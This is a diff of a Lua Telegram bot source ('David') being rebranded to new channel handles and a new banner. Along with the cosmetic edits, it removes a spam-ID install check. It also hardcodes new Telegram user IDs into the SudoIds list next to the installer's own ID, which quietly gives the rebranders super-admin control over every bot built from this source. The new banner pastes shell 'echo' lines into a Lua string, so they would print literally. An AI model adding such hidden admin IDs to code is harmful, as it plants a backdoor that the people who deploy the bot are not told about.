@@ -1,8 +1,8 @@
 ------------------------------------------------
--- This Source Was Developed By (Rio) @tsttt.--
---   This Is The Source Channel @SOURCEANUBIS .   --
+-- This Source Was Developed By (Rio) @siria100.--
+--   This Is The 𝑠𝑜𝑢𝑟𝑐𝑒 𝑠𝑖𝑟𝑖𝑎  @X_G_33 .   --
 --                - David -                 --
---        -- https://t.me/SOURCEANUBIS --         --
+--        -- https://t.me/X_G_33 --         --
 ------------------------------------------------ 
 DevRio  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./libs/serpent.lua")
@@ -25,21 +25,12 @@ if not DevRio:get(Server.."IdDavid") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Is_Spam' then
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-os.execute('lua David.lua') 
-end ---ifBn
-if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 DevRio:set(Server.."IdDavid",DevId) 
-end ---ifok
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-end
+end 
 os.execute('lua David.lua') 
-end
 end 
 if not DevRio:get(Server.."TokenDavid") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
@@ -128,20 +119,27 @@ return config
 end  
 Load_David() 
 print("\27[36m"..[[          
-              _______    _  __
-     /\      |__   __|  | |/ /
-    /  \   _ __ | | __ _| ' / 
-   / /\ \ | '_ \| |/ _` |  <  
-  / ____ \| | | | | (_| | . \ 
- /_/    \_\_| |_|_|\__,_|_|\_\
- 
+echo "  ██████  ██▓ ██▀███   ██▓ ▄▄▄      ";
+echo "▒██    ▒ ▓██▒▓██ ▒ ██▒▓██▒▒████▄    ";
+echo "░ ▓██▄   ▒██▒▓██ ░▄█ ▒▒██▒▒██  ▀█▄  ";
+echo "  ▒   ██▒░██░▒██▀▀█▄  ░██░░██▄▄▄▄██ ";
+echo "▒██████▒▒░██░░██▓ ▒██▒░██░ ▓█   ▓██▒";
+echo "▒ ▒▓▒ ▒ ░░▓  ░ ▒▓ ░▒▓░░▓   ▒▒   ▓▒█░";
+echo "░ ░▒  ░ ░ ▒ ░  ░▒ ░ ▒░ ▒ ░  ▒   ▒▒ ░";
+echo "░  ░  ░   ▒ ░  ░░   ░  ▒ ░  ░   ▒   ";
+echo "      ░   ░     ░      ░        ░  ░";
+echo "                                    ";
+  
+> CH › @SIRIA199
+> CH › @SIRIA199
+~> DEVELOPER › @SIRIA199
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1558668590,1867782978}
+SudoIds = {Config.SudoIds,1950281200 ,1364212456,000000}
 David = Config.David
 TokenBot = Config.TokenBot
-NameBot = (DevRio:get(David..'Rio:NameBot') or 'انتاك')
+NameBot = (DevRio:get(David..'Rio:NameBot') or 'سوريا')
 --     Source David     --
 FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
 FilesNumber = 0
